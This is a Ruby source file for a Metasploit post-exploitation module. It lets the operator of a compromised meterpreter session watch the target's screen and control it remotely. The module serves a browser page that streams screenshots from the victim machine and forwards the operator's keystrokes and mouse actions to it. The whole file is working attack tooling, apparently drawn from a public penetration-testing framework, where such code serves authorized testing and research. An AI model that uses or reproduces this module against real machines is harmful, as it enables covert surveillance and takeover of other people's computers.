##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Manage the screen of the target meterpreter session',
        'Description' => %q{
          This module allows you to view and control the screen of the target computer via
          a local browser window. The module continually screenshots the target screen and
          also relays all mouse and keyboard events to session.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'timwr'],
        'Platform' => [ 'linux', 'win', 'osx' ],
        'SessionTypes' => [ 'meterpreter' ],
        'DefaultOptions' => { 'SRVHOST' => '127.0.0.1' },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_ui_desktop_screenshot
              stdapi_ui_send_keyevent
              stdapi_ui_send_mouse
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def run
    @last_sequence = 0
    @key_sequence = {}
    exploit
  end

  def perform_event(query)
    action = query['action']

    if action == 'key'
      key = query['key']
      keyaction = query['keyaction']
      session.ui.keyevent_send(key, keyaction) if key
    else
      x = query['x']
      y = query['y']
      session.ui.mouse(action, x, y)
    end
  end

  def supports_espia?(session)
    return false unless session.platform == 'windows'

    session.core.use('espia') unless session.espia
    session.espia.present?
  rescue RuntimeError
    false
  end

  # rubocop:disable Metrics/MethodLength
  def on_request_uri(cli, request)
    if request.uri =~ %r{/screenshot$}
      data = ''
      if supports_espia?(session)
        data = session.espia.espia_image_get_dev_screen
      else
        data = session.ui.screenshot(50)
      end
      send_response(cli, data, { 'Content-Type' => 'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache' })
    elsif request.uri =~ %r{/event$}
      query = JSON.parse(request.body)
      seq = query['i']
      if seq <= @last_sequence + 1
        perform_event(query)
        @last_sequence = seq
      else
        @key_sequence[seq] = query
      end
      loop do
        event = @key_sequence[@last_sequence + 1]
        break unless event

        perform_event(event)
        @last_sequence += 1
        @key_sequence.delete(@last_sequence)
      end

      send_response(cli, '')
    else
      print_status("Sent screenshare html to #{cli.peerhost}")
      uripath = get_resource
      uripath += '/' unless uripath.end_with? '/'
      html = %^<!html>
<head>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Metasploit screenshare</title>
</head>
<body>
<noscript>
<h2 style="color:#f00">Error: You need JavaScript enabled to watch the stream.</h2>
</noscript>
<div id="error" style="display: none">
  An error occurred when loading the latest screen share.
</div>
<div id="container">
  <div class="controls">
    <span>
      <label for="isControllingCheckbox">Controlling target?</label>
      <input type="checkbox" id="isControllingCheckbox" name="scales">
    </span>
    <span>
      <label for="screenScaleFactorInput">Screen size</label>
      <input type="range" id="screenScaleFactorInput" min="0.01" max="2" step="0.01" />
    </span>
    <span>
      <label for="refreshRateInput">Image delay</label>
      <input type="range" id="imageDelayInput" min="16" max="60000" step="1" />
      <span id="imageDelayLabel" />
    </span>
  </div>
  <canvas id="canvas" />
</div>
<div>
  <a href="https://www.metasploit.com" target="_blank">www.metasploit.com</a>
</div>
</body>
<script type="text/javascript">
"use strict";

var state = {
  eventCount: 1,
  isControlling: false,
  // 1 being original size, 0.5 half size, 2 being twice as large
  screenScaleFactor: 1,
  // In milliseconds, 1 capture every 60 seconds
  imageDelay: 60000,
};

var container = document.getElementById("container");
var error = document.getElementById("error");
var img = new Image();
var controllingCheckbox = document.getElementById("isControllingCheckbox");
var imageDelayInput = document.getElementById("imageDelayInput");
var imageDelayLabel = document.getElementById("imageDelayLabel");
var screenScaleFactorInput = document.getElementById("screenScaleFactorInput");
var canvas = document.getElementById("canvas");
var ctx = canvas.getContext("2d");

/////////////////////////////////////////////////////////////////////////////
// Form binding
/////////////////////////////////////////////////////////////////////////////

setTimeout(synchronizeState, 0);

controllingCheckbox.onclick = function () {
  state.isControlling = controllingCheckbox.checked;
  synchronizeState();
};

imageDelayInput.oninput = function (e) {
  state.imageDelay = Number(e.target.value);
  synchronizeState();
};

screenScaleFactorInput.oninput = function (e) {
  state.screenScaleFactor = Number(e.target.value);
  synchronizeState();
};

function synchronizeState() {
  screenScaleFactorInput.value = state.screenScaleFactor;
  imageDelayInput.value = state.imageDelay;
  imageDelayLabel.innerHTML = state.imageDelay + " milliseconds";
  controllingCheckbox.checked = state.isControlling;
  scheduler.setDelay(state.imageDelay);
  updateCanvas();
}

/////////////////////////////////////////////////////////////////////////////
// Canvas Refeshing
/////////////////////////////////////////////////////////////////////////////

// Schedules the queued function to be invoked after the required period of delay.
// If a queued function is originally queued for a delay of one minute, followed
// by an updated delay of 1000ms, the previous delay will be ignored - and the
// required function will instead be invoked 1 second later as requested.
function Scheduler(initialDay) {
  var previousTimeoutId = null;
  var delay = initialDay;
  var previousFunc = null;

  this.setDelay = function (value) {
    if (value === delay) return;
    delay = value;
    this.queue(previousFunc);
  };

  this.queue = function (func) {
    clearTimeout(previousTimeoutId);
    previousTimeoutId = setTimeout(func, delay);
    previousFunc = func;
  };

  return this;
}
var scheduler = new Scheduler(state.imageDelay);

function updateCanvas() {
  canvas.width = img.width * state.screenScaleFactor;
  canvas.height = img.height * state.screenScaleFactor;
  ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

  error.style = "display: none";
}

function showError() {
  error.style = "display: initial";
}

// Fetches the latest image, and queues an additional image refresh once complete
function fetchLatestImage() {
  var nextImg = new Image();
  nextImg.onload = function () {
    img = nextImg;
    updateCanvas();
    scheduler.queue(fetchLatestImage);
  };
  nextImg.onerror = function () {
    showError();
    scheduler.queue(fetchLatestImage);
  };
  nextImg.src = "#{uripath}screenshot#" + Date.now();
}

fetchLatestImage();

/////////////////////////////////////////////////////////////////////////////
// Canvas interaction
/////////////////////////////////////////////////////////////////////////////

// Returns a function, that when invoked, will only run at most once within
// the required timeframe. This reduces the rate at which a function will be
// called. Particularly useful for reducing the amount of mouse movement events.
function throttle(func, limit) {
  limit = limit || 200;
  var timeoutId;
  var previousTime;
  var context;
  var args;
  return function () {
    context = this;
    args = arguments;
    if (!previousTime) {
      func.apply(context, args);
      previousTime = Date.now();
    } else {
      clearTimeout(timeoutId);
      timeoutId = setTimeout(function () {
        if (Date.now() - previousTime >= limit) {
          func.apply(context, args);
          previousTime = Date.now();
        }
      }, limit - (Date.now() - previousTime));
    }
  };
}

function sendEvent(event) {
  if (!state.isControlling) {
    return;
  }

  event["i"] = state.eventCount++;
  var req = new XMLHttpRequest();
  req.open("POST", "#{uripath}event", true);
  req.setRequestHeader("Content-type", 'application/json;charset=UTF-8');
  req.send(JSON.stringify(event));
}

function mouseEvent(action, e) {
  sendEvent({
    action: action,
    // Calculate mouse position relative to the original screensize
    x: Math.round(
      (e.pageX - canvas.offsetLeft) * (1 / state.screenScaleFactor)
    ),
    y: Math.round(
      (e.pageY - canvas.offsetTop) * (1 / state.screenScaleFactor)
    ),
  });
}

function keyEvent(action, key) {
  if (key === 59) {
    key = 186;
  } else if (key === 61) {
    key = 187;
  } else if (key === 173) {
    key = 189;
  }
  sendEvent({
    action: "key",
    keyaction: action,
    key: key,
  });
}

document.onkeydown = throttle(function (e) {
  if (!state.isControlling) {
    return;
  }
  var key = e.which || e.keyCode;
  keyEvent(1, key);
  e.preventDefault();
});

document.onkeyup = function (e) {
  if (!state.isControlling) {
    return;
  }
  var key = e.which || e.keyCode;
  keyEvent(2, key);
  e.preventDefault();
};

canvas.addEventListener(
  "contextmenu",
  function (e) {
    if (!state.isControlling) {
      return;
    }
    e.preventDefault();
  },
  false
);

canvas.onmousemove = throttle(function (e) {
  if (!state.isControlling) {
    return;
  }
  mouseEvent("move", e);
  e.preventDefault();
});

canvas.onmousedown = function (e) {
  if (!state.isControlling) {
    return;
  }
  var action = "leftdown";
  if (e.which === 3) {
    action = "rightdown";
  }
  mouseEvent(action, e);
  e.preventDefault();
};

canvas.onmouseup = function (e) {
  if (!state.isControlling) {
    return;
  }
  var action = "leftup";
  if (e.which === 3) {
    action = "rightup";
  }
  mouseEvent(action, e);
  e.preventDefault();
};

canvas.ondblclick = function (e) {
  if (!state.isControlling) {
    return;
  }
  mouseEvent("doubleclick", e);
  e.preventDefault();
};
</script>
<style>
body {
  color: rgba(0, 0, 0, .85);
  font-size: 16px;
}

input {
  padding: 0.5em 0.6em;
  display: inline-block;
  vertical-align: middle;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}

.controls {
  line-height: 2;
}
</style>
</html>
    ^
      send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })
    end
  end
  # rubocop:enable Metrics/MethodLength
end
